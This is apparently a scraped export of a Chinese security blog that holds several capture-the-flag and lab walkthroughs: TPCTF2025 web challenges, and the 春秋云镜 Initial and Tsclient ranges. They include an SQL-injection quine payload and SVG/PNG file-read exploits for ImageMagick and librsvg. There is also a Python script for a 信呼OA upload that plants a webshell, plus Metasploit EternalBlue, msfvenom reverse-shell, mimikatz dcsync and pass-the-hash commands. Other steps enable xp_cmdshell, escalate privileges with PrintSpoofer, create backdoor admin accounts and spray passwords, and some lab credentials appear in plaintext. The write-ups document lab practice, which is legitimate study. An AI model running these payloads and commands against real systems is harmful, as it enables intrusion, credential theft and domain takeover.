data.replace(\u0026#39;$$\u0026#39;,\u0026#34;REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)\u0026#34;) 5 blob = data.replace(\u0026#39;$$\u0026#39;,\u0026#39;\u0026#34;$\u0026#34;\u0026#39;).replace(\u0026#34;\u0026#39;\u0026#34;,\u0026#39;\u0026#34;\u0026#39;) 6 data = data.replace(\u0026#39;$$\u0026#39;,\u0026#34;\u0026#39;\u0026#34;+blob+\u0026#34;\u0026#39;\u0026#34;) 7 if debug: 8 print (data) 9 return data 10 11data = quine(\u0026#34;1\u0026#39; union select 1,2,$$--\u0026#34;) 完整payload\n1POST /flag/ HTTP/1.1 2Host: 127.0.0.1:7788 3sec-ch-ua-mobile: ?0 4Sec-Fetch-Site: cross-site 5Upgrade-Insecure-Requests: 1 6Sec-Fetch-Dest: document 7sec-ch-ua-platform: \u0026#34;Windows\u0026#34; 8sec-ch-ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;134\u0026#34;, \u0026#34;Not:A-Brand\u0026#34;;v=\u0026#34;24\u0026#34;, \u0026#34;Google Chrome\u0026#34;;v=\u0026#34;134\u0026#34; 9Referer: http://mitm/ 10Sec-Fetch-Mode: navigate 11Sec-Fetch-User: ?1 12Accept-Language: zh-CN,zh;q=0.9 13User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 14Accept-Encoding: gzip, deflate, br, zstd 15Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 16Content-Type: multipart/form-data; boundary=a 17 18--a 19Content-Disposition: form-data; name=\u0026#34;username\u0026#34; 20 21admin 22--a 23Content-Disposition: form-data; name=\u0026#34;password\u0026#34;;filename=\u0026#34;password\u0026#34; 24Content-Disposition: form-data; name=\u0026#34;password\u0026#34;; 25 261\u0026#39; union select 1,2,REPLACE(REPLACE(\u0026#39;1\u0026#34; union select 1,2,REPLACE(REPLACE(\u0026#34;$\u0026#34;,CHAR(34),CHAR(39)),CHAR(36),\u0026#34;$\u0026#34;)--\u0026#39;,CHAR(34),CHAR(39)),CHAR(36),\u0026#39;1\u0026#34; union select 1,2,REPLACE(REPLACE(\u0026#34;$\u0026#34;,CHAR(34),CHAR(39)),CHAR(36),\u0026#34;$\u0026#34;)--\u0026#39;)-- 27--a-- thumbor1 thumbor是一个图片处理服务工具，可以对图片进行动态调整\n附件只有一个dockerfile\n可以起个docker拿一下源码\n这题不是因为thumbor有问题，而是因为thumbor的一个组件ImageMagick存在任意文件读取漏洞，也就是CVE-2022-44268。\n去GitHub找一个POC\nvoidz0r/CVE-2022-44268: A PoC for the CVE-2022-44268 - ImageMagick arbitrary file read\n从readme可以看到这里可以通过类似ssrf的方式远程加载图片\n在vps上构造好png，远程加载即可\nhttp://localhost:8800/thumbor/unsafe/450x/YOUR_IP/图片 其实就是复现cve\nthumbor2 dockerfile里面增加了最新版的ImageMagick，其实就是修复了上一题的ImageMagick\n这题是另一个组件librsvg的漏洞，CVE-2023-38633\nlibrsvg 2.56.3 之前版本中 URL 解码器的目录遍历问题，可以被本地或远程攻击者用来泄露文件（在预期区域之外的本地文件系统上），例如通过在 xi:include 元素中使用 href=“.?../…/…/…/…/…/…/…/…/…/etc/passwd” 来读取结果。 原文链接：https://blog.csdn.net/HMX404/article/details/137231580\n原理参考文章：\nWhen URL parsers disagree (CVE-2023-38633) - Canva Engineering Blog\npayload：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;no\u0026#34;?\u0026gt; \u0026lt;svg width=\u0026#34;3000\u0026#34; height=\u0026#34;3000\u0026#34; xmlns:xi=\u0026#34;http://www.w3.org/2001/XInclude\u0026#34;\u0026gt; \u0026lt;rect width=\u0026#34;3000\u0026#34; height=\u0026#34;3000\u0026#34; style=\u0026#34;fill:rgb(255,255,255);\u0026#34; /\u0026gt; \u0026lt;text x=\u0026#34;0\u0026#34; y=\u0026#34;1500\u0026#34; font-size=\u0026#34;100\u0026#34;\u0026gt; \u0026lt;xi:include href=\u0026#34;.?../../../../../../../../flag\u0026#34; parse=\u0026#34;text\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;xi:fallback\u0026gt;file not found\u0026lt;/xi:fallback\u0026gt; \u0026lt;/xi:include\u0026gt; \u0026lt;/text\u0026gt; \u0026lt;/svg\u0026gt; 跟上题差不多，在服务器上创建一个txt，将payload写进去，远程加载即可\nhttp://localhost:8800/thumbor/unsafe/450x/YOUR_IP/poc.txt ","permalink":"http://localhost:1313/post/tpctf_2025/","summary":"\u003cblockquote\u003e\n\u003cp\u003e参考文章\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://blog.0xfff.team/posts/tpctf_2025_writeup/\"\u003ehttps://blog.0xfff.team/posts/tpctf_2025_writeup/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://z3n1th1.com/2025/03/tpctf2025-writeup/\"\u003ehttps://z3n1th1.com/2025/03/tpctf2025-writeup/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://blog.xmcve.com/2025/03/11/TPCTF2025-Writeup/\"\u003eTPCTF2025 Writeup - 星盟安全团队\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch3 id=\"baby-layout\"\u003ebaby layout\u003c/h3\u003e\n\u003cp\u003e这是一道关于绕过DOMPurify库，进行xss cookie窃取的题目\u003c/p\u003e\n\u003cp\u003eDOMPurify 是一个专门用于清理 HTML 输入的 JavaScript 库，旨在防止跨站脚本 (XSS) 攻击。它通过过滤和净化用户提供的 HTML 内容，确保其安全地嵌入到网页中，避免恶意代码的执行。\u003c/p\u003e","title":"TPCTF2025-Web-赛后复现Writeup"},{"content":" 参考文章\nhttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\n菜鸡第一个通关的靶场Orz\nFLAG1 fscan扫一下\n./fscan.exe -h 39.99.139.119 直接用thinkphpgui写马连蚁剑\n先用vshell上线\n读flag需要提权\npeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\n传个linpeas扫一下\n./linpeas_linux_amd64 \u0026gt; output.txt 在历史文件中找到疑似读flag的命令\n其实这就是一个简单的sudo提权\n渗透测试：Linux提权精讲（三）之sudo方法第三期_nmap sudo 提权-CSDN博客\nmysql 是配置了 sudo 免密使用的，可以使用 mysql 提权，通过mysql执行命令来读flag\npayload:\nsudo mysql -e \u0026#39;\\! /bin/sh\u0026#39;\rcat /root/flag/flag* flag01: flag{60b53231- 接下来搭代理\n查内网ip\n接着传一个fscan扫一下内网\nfs -h 172.22.1.0/24 -nobr -nopoc -hn 172.22.1.15 收集到的信息\n172.22.1.2:DC域控\r172.22.1.21:Windows的机器并且存在MS17-010 漏洞\r172.22.1.18:信呼OA办公系统 FLAG2 先看信呼\n弱口令成功登入admin/admin123\n信呼协同办公系统v2.2.8存在文件上传漏洞\n[Awesome-POC/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md at master · Threekiii/Awesome-POC](https://github.com/Threekiii/Awesome-POC/blob/master/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md)\n1import requests 2 3session = requests.session() 4url_pre = \u0026#39;http://172.22.1.18/\u0026#39; 5url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; 6url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; 7# url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=\u0026lt;ID\u0026gt;\u0026#39; 8data1 = { 9 \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, 10 \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, 11 \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, 12 \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, 13 \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, 14 \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, 15 \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; 16} 17 18r = session.post(url1, data=data1) 19r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r\u0026#39;)}) 20filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) 21filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; 22print(filepath) 23id = r.json()[\u0026#39;id\u0026#39;] 24url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; 25r = session.get(url3) 26r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) 27print(r.text) 写马之后直接读flag就行\nflag02: 2ce3-4813-87d4- FLAG3 永恒之蓝可以用msf打\n现在kali上用proxychains4简单配个代理\nproxychains4 msfconsole\rsearch ms17-010 有四个不同的模块\n这里使用第一个模块，因为利用范围比较广\nuse exploit/windows/smb/ms17_010_eternalblue # 选择使用的模块\rset payload windows/x64/meterpreter/bind_tcp_uuid # 设置payload，可以通过show payloads查看\rset RHOSTS 172.22.1.21 # 设置靶机的ip\rexploit # 发起攻击 成功了\nmeterpreter \u0026gt; screenshot # 捕获屏幕\rmeterpreter \u0026gt; upload hello.txt c:// #上传文件\rmeterpreter \u0026gt; download d://1.txt # 下载文件\rmeterpreter \u0026gt; shell # 获取cmd\rmeterpreter \u0026gt; clearev # 清除日志 load kiwi # 调用mimikatz模块\rkiwi_cmd \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit # 导出域内所有用户的信息(包括哈希值) 拿到Administrator 用户的 hash，接着使用 crackmapexec 来进行哈希传递攻击，来实现 DC域控 上的任意命令执行\nproxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \u0026#34;type Users\\Administrator\\flag\\flag03.txt\u0026#34; 拿到最后一个flag\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial-writeup/","summary":"\u003cblockquote\u003e\n\u003cp\u003e参考文章\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\"\u003ehttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e菜鸡第一个通关的靶场Orz\u003c/p\u003e\n\u003ch3 id=\"flag1\"\u003eFLAG1\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306184027336\" loading=\"lazy\" src=\"../assets/image-20250306184027336.png\"\u003e\u003c/p\u003e\n\u003cp\u003efscan扫一下\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e./fscan.exe -h 39.99.139.119\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg alt=\"image-20250306184106697\" loading=\"lazy\" src=\"../assets/image-20250306184106697.png\"\u003e\u003c/p\u003e\n\u003cp\u003e直接用thinkphpgui写马连蚁剑\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306185409381\" loading=\"lazy\" src=\"../assets/image-20250306185409381.png\"\u003e\u003c/p\u003e\n\u003cp\u003e先用vshell上线\u003c/p\u003e\n\u003cp\u003e读flag需要提权\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/peass-ng/PEASS-ng\"\u003epeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\u003c/a\u003e\u003c/p\u003e","title":"春秋云镜-Initial-Writeup"},{"content":"Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。\n参考文章\n春秋云镜 TSclient \u0026ndash; Walkthrough - KingBridge - 博客园\n春秋云境 Tsclient | 初零·b10g~🥝\nFLAG1 先用fscan扫一下\nmssql服务是弱口令\nsa/1qaz!QAZ 用数据库管理工具连上去\n接下来要看mssql怎么进行命令执行\n参考文章：\nhttps://xz.aliyun.com/news/7129\n判断xp_cmdshell状态\nselect * from master.dbo.sysobjects where xtype=\u0026#39;x\u0026#39; and name=\u0026#39;xp_cmdshell\u0026#39; 存在\n那我们接下来启动它\nEXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1;RECONFIGURE;EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;RECONFIGURE; 配置选项 \u0026#39;xp_cmdshell\u0026#39; 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。 启动成功\n接下来就可以进行命令执行了\nexec master..xp_cmdshell \u0026#39;whoami\u0026#39; 接下来直接vshell一句话上线\n没找到flag，发现Administrator文件夹没有权限\n想到要提权，传一个PrintSpoofer进行提权\nhttps://github.com/whojeff/PrintSpoofer\n1PrintSpoofer.exe -i -c cmd 提权之后拿到flag\n1C:\\Tmp\u0026gt;type C:\\Users\\Administrator\\flag\\flag01.txt 2 _________ ________ ________ ___ ___ _______ ________ _________ 3|\\___ ___\\\\ ____\\|\\ ____\\|\\ \\ |\\ \\|\\ ___ \\ |\\ ___ \\|\\___ ___\\ 4\\|___ \\ \\_\\ \\ \\___|\\ \\ \\___|\\ \\ \\ \\ \\ \\ \\ __/|\\ \\ \\\\ \\ \\|___ \\ \\_| 5 \\ \\ \\ \\ \\_____ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\_|/_\\ \\ \\\\ \\ \\ \\ \\ \\ 6 \\ \\ \\ \\|____|\\ \\ \\ \\____\\ \\ \\____\\ \\ \\ \\ \\_|\\ \\ \\ \\\\ \\ \\ \\ \\ \\ 7 \\ \\__\\ ____\\_\\ \\ \\_______\\ \\_______\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\ \\__\\ 8 \\|__| |\\_________\\|_______|\\|_______|\\|__|\\|_______|\\|__| \\|__| \\|__| 9 \\|_________| 10 11 12Getting flag01 is easy, right? 13 14flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4} 15 16 17Maybe you should focus on user sessions... 提权之后用提权后的账户重新上一下线\n接下来用fscan扫一下内网\n1┌──────────────────────────────────────────────┐ 2│ ___ _ │ 3│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 4│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │ 5│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │ 6│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 7└──────────────────────────────────────────────┘ 8 Fscan Version: 2.0.0 9 10[2025-03-09 19:53:19] [INFO] 暴力破解线程数: 1 11[2025-03-09 19:53:19] [INFO] 开始信息扫描 12[2025-03-09 19:53:19] [INFO] CIDR范围: 172.22.8.0-172.22.8.255 13[2025-03-09 19:53:20] [INFO] 生成IP范围: 172.22.8.0.%!d(string=172.22.8.255) - %!s(MISSING).%!d(MISSING) 14[2025-03-09 19:53:20] [INFO] 解析CIDR 172.22.8.0/24 -\u0026gt; IP范围 172.22.8.0-172.22.8.255 15[2025-03-09 19:53:20] [INFO] 最终有效主机数量: 256 16[2025-03-09 19:53:20] [INFO] 开始主机扫描 17[2025-03-09 19:53:20] [INFO] 正在尝试无监听ICMP探测... 18[2025-03-09 19:53:20] [INFO] 当前用户权限不足,无法发送ICMP包 19[2025-03-09 19:53:20] [INFO] 切换为PING方式探测... 20[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.31 存活 (ICMP) 21[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.18 存活 (ICMP) 22[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.15 存活 (ICMP) 23[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.46 存活 (ICMP) 24[2025-03-09 19:53:23] [INFO] 存活主机数量: 4 25[2025-03-09 19:53:23] [INFO] 有效端口数量: 233 26[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.15:88 27[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.46:80 28[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.18:80 29[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:139 30[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:139 31[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:135 32[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:135 33[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:135 34[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:135 35[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:139 36[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:139 37[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:445 38[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:445 39[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:445 40[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:445 41[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:389 42[2025-03-09 19:53:26] [SUCCESS] 端口开放 172.22.8.18:1433 43[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.15:88 =\u0026gt; 44[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.46:80 =\u0026gt; [http] 45[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.18:80 =\u0026gt; [http] 46[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.18:139 =\u0026gt; Banner:[.] 47[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.31:139 =\u0026gt; Banner:[.] 48[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.46:139 =\u0026gt; Banner:[.] 49[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.15:139 =\u0026gt; Banner:[.] 50[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.46:445 =\u0026gt; 51[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.15:445 =\u0026gt; 52[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.31:445 =\u0026gt; 53[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.18:445 =\u0026gt; 54[2025-03-09 19:53:31] [SUCCESS] 服务识别 172.22.8.18:1433 =\u0026gt; [ms-sql-s] 版本:13.00.1601 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.A.] 55[2025-03-09 19:53:35] [SUCCESS] 服务识别 172.22.8.15:389 =\u0026gt; 56[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.15:135 =\u0026gt; 57[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.46:135 =\u0026gt; 58[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.31:135 =\u0026gt; 59[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.18:135 =\u0026gt; 60[2025-03-09 19:54:29] [INFO] 存活端口数量: 17 61[2025-03-09 19:54:30] [INFO] 开始漏洞扫描 62[2025-03-09 19:54:30] [INFO] 加载的插件: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle 63[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 64目标主机: 172.22.8.18 65主机名: WIN-WEB 66发现的网络接口: 67 IPv4地址: 68 └─ 172.22.8.18 69 IPv6地址: 70 └─ 2001:0:348b:fb58:1445:3719:d89d:8092 71[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT 72[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 73目标主机: 172.22.8.15 74主机名: DC01 75发现的网络接口: 76 IPv4地址: 77 └─ 172.22.8.15 78[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 79目标主机: 172.22.8.46 80主机名: WIN2016 81发现的网络接口: 82 IPv4地址: 83 └─ 172.22.8.46 84[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 85目标主机: 172.22.8.31 86主机名: WIN19-CLIENT 87发现的网络接口: 88 IPv4地址: 89 └─ 172.22.8.31 90[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server 2016 Datacenter 14393 91[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.15 DC:XIAORANG\\DC01 92[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.46 状态码:200 长度:703 标题:IIS Windows Server 93[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.18 状态码:200 长度:703 标题:IIS Windows Server 94[2025-03-09 19:54:31] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ 95[2025-03-09 19:54:53] [SUCCESS] 扫描已完成: 32/32 扫到三台机子\nNetBios 172.22.8.46 WIN2016.xiaorang.lab NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT\rNetBios 172.22.8.15 DC:XIAORANG\\DC01 没有什么能直接利用的服务\n那我们接着信息收集一下\nnet user 主机名: WIN-WEB\rOS 名称: Microsoft Windows Server 2016 Datacenter\rOS 版本: 10.0.14393 暂缺 Build 14393\rOS 制造商: Microsoft Corporation\rOS 配置: 独立服务器\rOS 构件类型: Multiprocessor Free\r注册的所有人:\r注册的组织: Aliyun\r产品 ID: 00376-40000-00000-AA947\r初始安装日期: 2022/7/11, 12:46:14\r系统启动时间: 2025/3/9, 18:28:29\r系统制造商: Alibaba Cloud\r系统型号: Alibaba Cloud ECS\r系统类型: x64-based PC\r处理器: 安装了 1 个处理器。\r[01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz\rBIOS 版本: SeaBIOS 449e491, 2014/4/1\rWindows 目录: C:\\Windows\r系统目录: C:\\Windows\\system32\r启动设备: \\Device\\HarddiskVolume1\r系统区域设置: zh-cn;中文(中国)\r输入法区域设置: zh-cn;中文(中国)\r时区: (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐\r物理内存总量: 3,950 MB\r可用的物理内存: 883 MB\r虚拟内存: 最大值: 5,848 MB\r虚拟内存: 可用: 1,169 MB\r虚拟内存: 使用中: 4,679 MB\r页面文件位置: C:\\pagefile.sys\r域: WORKGROUP\r登录服务器: 暂缺\r修补程序: 安装了 6 个修补程序。\r[01]: KB5013625\r[02]: KB4049065\r[03]: KB4486129\r[04]: KB4486131\r[05]: KB5014026\r[06]: KB5013952\r网卡: 安装了 1 个 NIC。\r[01]: Red Hat VirtIO Ethernet Adapter\r连接名: 以太网\r启用 DHCP: 是\rDHCP 服务器: 172.22.255.253\rIP 地址\r[01]: 172.22.8.18\r[02]: fe80::205a:dd47:2165:6397\rHyper-V 要求: 已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。 C:\\Tmp\u0026gt;net user\r\\\\ 的用户帐户\r-------------------------------------------------------------------------------\rAdministrator DefaultAccount Guest\rJohn test\r命令运行完毕，但发生一个或多个错误。 C:\\Tmp\u0026gt;quser\r用户名 会话名 ID 状态 空闲时间 登录时间\rjohn rdp-tcp#0 2 运行中 2:38 2025/3/9 18:30 发现一个john用户远程连接本台机子\n为了方便可以新建一个用户rdp连上去\nC:\\Tmp\u0026gt;net user xrntkk Abc20060201 /add\r命令成功完成。\rC:\\Tmp\u0026gt;net localgroup administrators xrntkk /add\r命令成功完成。\rC:\\Tmp\u0026gt;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\r操作成功完成。 管理员权限可以偷RDP用户的token，从而查看其挂载的盘。\n这里可以用msf的incognito模块\nubuntu@VM-20-9-ubuntu:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=106.55.168.231 LPORT=9999 -f exe -o msf.exe\r[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 510 bytes\rFinal size of exe file: 7168 bytes\rSaved as: msf.exe 先用msf上个线\nmsfconsole\ruse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 106.55.168.231\rset lport 9999\rexploit 上线\n接着用incognito模块偷John的token\n1meterpreter \u0026gt; use incognito 2Loading extension incognito...Success. 3meterpreter \u0026gt; list_tokens -u 4 5Delegation Tokens Available 6======================================== 7IIS APPPOOL\\DefaultAppPool 8NT AUTHORITY\\LOCAL SERVICE 9NT AUTHORITY\\NETWORK SERVICE 10NT AUTHORITY\\SYSTEM 11NT SERVICE\\MsDtsServer130 12NT SERVICE\\MSSQLFDLauncher 13NT SERVICE\\MSSQLSERVER 14NT SERVICE\\MSSQLServerOLAPService 15NT SERVICE\\ReportServer 16NT SERVICE\\SQLTELEMETRY 17NT SERVICE\\SSASTELEMETRY 18NT SERVICE\\SSISTELEMETRY130 19WIN-WEB\\John 20WIN-WEB\\test 21WIN-WEB\\xrntkk 22Window Manager\\DWM-1 23Window Manager\\DWM-2 24Window Manager\\DWM-3 25Window Manager\\DWM-4 26 27Impersonation Tokens Available 28======================================== 29No tokens available 可以看到已经拿到John的token了\n以John的身份运行cmd\n1meterpreter \u0026gt; impersonate_token WIN-WEB\\\\John 2[+] Delegation token available 3[+] Successfully impersonated user WIN-WEB\\John 4meterpreter \u0026gt; shell 5Process 7508 created. 6Channel 1 created. 7... 8 9C:\\Tmp\u0026gt;whoami 10whoami 11win-web\\john net use 看一下挂载情况（不知道为啥我这乱码了）\n挂载了c盘\n查看c盘中的credential.txt文件\nC:\\Tmp\u0026gt;type \\\\TSCLIENT\\C\\credential.txt\rtype \\\\TSCLIENT\\C\\credential.txt\rxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\rDo you know how to hijack Image? 这里有一串账号密码，用这串账号密码进行一个密码喷洒\ncrackmapexec -q smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# ┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]\r└─# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Zproxychains4 crackmapexec smb 172.22.8.0/24\r-u Aldrich -p Ald@rLMWuy7Z\rSMB 172.22.8.18 445 WIN-WEB [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)\rSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.46 445 WIN2016 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)\rSMB 172.22.8.18 445 WIN-WEB [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.31 445 WIN19-CLIENT [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE 可以看到这三台机貌似都能登上去\nSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False) 我这里选择登31\nproxychains4 rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p \u0026#39;Ald@rLMWuy7Z!#\u0026#39; 这里要用rdesktop登，rdp登不上\n会提示密码过期，改个密码就行了\n但是改完密码这台机还是登不上，没有登陆权限\n所以我们尝试用这个修改后的账号密码再去登这个账号的另一台机子\n成功在46中登入，后面还是用rdp吧，rdesktop也太卡了\nxiaorang.lab\\Aldrich\rAbc123456 FLAG2 信息收集一下\n可以看到我们已经拿下域内的一台机子了\nsysteminfo 接着我们用bloodhound来进行一下域内信息收集\nSharpHound.exe -c all 